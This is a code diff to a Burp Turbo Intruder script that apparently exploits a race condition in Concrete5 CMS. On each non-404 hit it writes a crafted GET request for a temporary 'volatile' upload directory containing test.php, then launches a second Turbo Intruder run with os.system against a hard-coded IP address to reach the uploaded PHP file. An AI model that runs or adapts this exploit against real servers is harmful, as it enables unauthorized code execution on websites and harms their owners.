@@ -1,3 +1,5 @@
+import os
+
 def queueRequests(target, wordlists):
     engine = RequestEngine(  # this is just a protocol:domain:port string like https://example.com:443
         endpoint=target.endpoint,
@@ -29,9 +31,27 @@ Connection: close
 def handleResponse(req, interesting):
     if req.status!=404: 
          table.add(req)
+         f=open('/tmp/turbo.log','a')
          try:
-            for i in range(500000):
-                req.engine.queue(req.template, req.words[0]+'/test.php')
-         except Exception as e: 
-                print('error' + e)
+            oddRequest ="""GET /concrete5/application/files/tmp/volatile-0-%s/ HTTP/1.1
+Host: 13.40.10.158
+Connection: close
 
+"""
+            if len(req.words):
+                f.write('\nstart 2nd turbo')
+                g=open('/var/www/html/concrete5/exploit/request2.txt','w')
+                g.write(oddRequest.replace('%s/',req.words[0] +'/test.php'))
+                g.close()
+                os.system('java -jar /home/adrian/.BurpSuite/bapps/9abaa233088242e8be252cd4ff534988/build/libs/turbo-intruder-all.jar /var/www/html/concrete5/exploit/script2.py /var/www/html/concrete5/exploit/request2.txt http://13.40.10.158  foo')
+                f.write('\nfinished 2nd turbo')
+            #for i in range(500000):
+                #req.engine.queue(req.template, req.words[0]+'/test.php')
+         except Exception as e: 
+                f.write('error')
+                f.write(e)
+                #print('error' + e)
+         finally:
+                f.close()
+
+         
